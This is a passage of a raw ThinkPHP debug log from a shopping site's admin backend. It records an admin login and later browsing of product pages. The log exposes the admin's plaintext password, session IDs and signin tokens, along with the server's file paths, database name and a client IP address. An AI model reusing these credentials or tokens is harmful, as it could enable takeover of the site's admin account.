  'connection' => 'keep-alive',
  'content-length' => '64',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://www.ldkjmy.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://www.ldkjmy.com/admin/login/login.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0',
)
[ info ] [ PARAM ] array (
  'admin_username' => 'admin',
  'admin_pwd' => 'liujie',
  'verify' => 'rh232',
  'rememberme' => 'on',
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001394s ]
[ info ] [ RUN ] app\admin\controller\Login->runlogin[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Login.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000509s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000228s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_admin` [ RunTime:0.000754s ]
[ sql ] [ SQL ] SELECT * FROM `yf_admin` WHERE  `admin_username` = 'admin'  AND `admin_open` = 1 LIMIT 1 [ RunTime:0.000299s ]
[ sql ] [ SQL ] UPDATE `yf_admin`  SET `admin_hits`=78,`admin_last_ip`='171.117.143.245',`admin_last_time`=1572787010  WHERE  `admin_id` = 1 [ RunTime:0.000340s ]
[ sql ] [ SQL ] SELECT * FROM `yf_admin` WHERE  `admin_id` = 1 LIMIT 1 [ RunTime:0.000229s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_member_list` [ RunTime:0.000662s ]
[ sql ] [ SQL ] SELECT * FROM `yf_member_list` WHERE  `member_list_id` = 1 LIMIT 1 [ RunTime:0.000159s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:50+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/index/index.html
[ info ] www.ldkjmy.com/admin/index/index.html [运行时间：0.077228s][吞吐率：12.95req/s] [内存消耗：5,120.20kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/login/login.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001702s ]
[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/index/index.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'news_list',
  7 => 'news_count',
  8 => 'members_count',
  9 => 'sugs_count',
  10 => 'coms_count',
  11 => 'tonews_count',
  12 => 'ztnews_count',
  13 => 'difday',
  14 => 'tomembers_count',
  15 => 'ztmembers_count',
  16 => 'difday_m',
  17 => 'tosugs_count',
  18 => 'ztsugs_count',
  19 => 'difday_s',
  20 => 'tocoms_count',
  21 => 'ztcoms_count',
  22 => 'difday_c',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000518s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000227s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000721s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000193s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = -1 LIMIT 1 [ RunTime:0.000126s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = null ORDER BY `sort` [ RunTime:0.000152s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_news` [ RunTime:0.001056s ]
[ sql ] [ SQL ] SELECT * FROM `yf_news` WHERE  `news_l` = 'zh-cn' ORDER BY news_hits desc LIMIT 0,10 [ RunTime:0.000321s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_news` LIMIT 1 [ RunTime:0.000139s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_member_list` [ RunTime:0.000736s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_member_list` LIMIT 1 [ RunTime:0.000132s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_plug_sug` [ RunTime:0.000610s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_plug_sug` LIMIT 1 [ RunTime:0.000125s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_comments` [ RunTime:0.000611s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_comments` LIMIT 1 [ RunTime:0.000123s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_news` WHERE  `news_time` BETWEEN 1572710400 AND 1572796799 LIMIT 1 [ RunTime:0.000365s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_news` WHERE  `news_time` BETWEEN 1572624000 AND 1572710399 LIMIT 1 [ RunTime:0.000240s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_member_list` WHERE  `member_list_addtime` BETWEEN 1572710400 AND 1572796799 LIMIT 1 [ RunTime:0.001402s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_member_list` WHERE  `member_list_addtime` BETWEEN 1572624000 AND 1572710399 LIMIT 1 [ RunTime:0.000188s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_plug_sug` WHERE  `plug_sug_addtime` BETWEEN 1572710400 AND 1572796799 LIMIT 1 [ RunTime:0.001326s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_plug_sug` WHERE  `plug_sug_addtime` BETWEEN 1572624000 AND 1572710399 LIMIT 1 [ RunTime:0.000219s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_comments` WHERE  `createtime` BETWEEN 1572710400 AND 1572796799 LIMIT 1 [ RunTime:0.000158s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_comments` WHERE  `createtime` BETWEEN 1572624000 AND 1572710399 LIMIT 1 [ RunTime:0.000180s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:52+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_list.html
[ info ] www.ldkjmy.com/admin/product/product_list.html [运行时间：0.070737s][吞吐率：14.14req/s] [内存消耗：5,572.21kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/index/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001269s ]
[ info ] [ RUN ] app\admin\controller\Product->product_list[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_list.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'page',
  7 => 'menu',
  8 => 'product',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000672s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000298s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000845s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000169s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000220s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000119s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 7 ORDER BY `sort` [ RunTime:0.000146s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.001055s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) LIMIT 1 [ RunTime:0.000322s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) ORDER BY goodsId desc LIMIT 0,10 [ RunTime:0.000558s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:57+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_edit/goodsId/84.html
[ info ] www.ldkjmy.com/admin/product/product_edit/goodsId/84.html [运行时间：0.111632s][吞吐率：8.96req/s] [内存消耗：5,260.76kb] [文件加载：79]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_edit',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/product/product_list.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'goodsId' => '84',
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001749s ]
[ info ] [ RUN ] app\admin\controller\Product->product_edit[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_edit.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'goods_extra',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000581s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000248s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000941s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000180s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000208s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000179s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 0 LIMIT 1 [ RunTime:0.000141s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = null ORDER BY `sort` [ RunTime:0.000179s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.000925s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` WHERE  `goodsId` = 84 LIMIT 1 [ RunTime:0.000216s ]
---------------------------------------------------------------
[ 2019-11-03T21:17:00+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_list.html
[ info ] www.ldkjmy.com/admin/product/product_list.html [运行时间：0.064144s][吞吐率：15.59req/s] [内存消耗：5,571.95kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/product/product_edit/goodsId/84.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001302s ]
[ info ] [ RUN ] app\admin\controller\Product->product_list[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_list.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'page',
  7 => 'menu',
  8 => 'product',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000533s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000323s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000688s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000165s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000203s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000177s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000157s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 7 ORDER BY `sort` [ RunTime:0.000195s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.000860s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) LIMIT 1 [ RunTime:0.000167s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) ORDER BY goodsId desc LIMIT 0,10 [ RunTime:0.000262s ]
---------------------------------------------------------------
[ 2019-11-03T21:17:03+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_edit/goodsId/83.html
[ info ] www.ldkjmy.com/admin/product/product_edit/goodsId/83.html [运行时间：0.071129s][吞吐率：14.06req/s] [内存消耗：5,262.42kb] [文件加载：79]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_edit',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/product/product_list.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'goodsId' => '83',
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001835s ]
[ info ] [ RUN ] app\admin\controller\Product->product_edit[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_edit.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'goods_extra',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000705s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000316s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000767s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000192s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000128s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000157s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000198s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 0 LIMIT 1 [ RunTime:0.000189s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = null ORDER BY `sort` [ RunTime:0.000200s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.000852s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` WHERE  `goodsId` = 83 LIMIT 1 [ RunTime:0.000306s ]
---------------------------------------------------------------
[ 2019-11-03T21:41:24+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.030058s][吞吐率：33.27req/s] [内存消耗：2,517.41kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'aecept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:43:26+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/web_log/weblog_list.html
[ info ] www.ldkjmy.com/admin/web_log/weblog_list.html [运行时间：0.071255s][吞吐率：14.03req/s] [内存消耗：5,122.59kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'web_log',
    2 => 'weblog_list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/product/product_edit/goodsId/83.html',
  'acoept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001212s ]
[ info ] [ RUN ] app\admin\controller\WebLog->weblog_list[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/WebLog.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/web_log/weblog_list.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'weblog_list',
  7 => 'page',
  8 => 'request_module',
  9 => 'request_controller',
  10 => 'request_action',
  11 => 'request_method',
  12 => 'controllers',
  13 => 'actions',
  14 => 'methods',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000733s ]
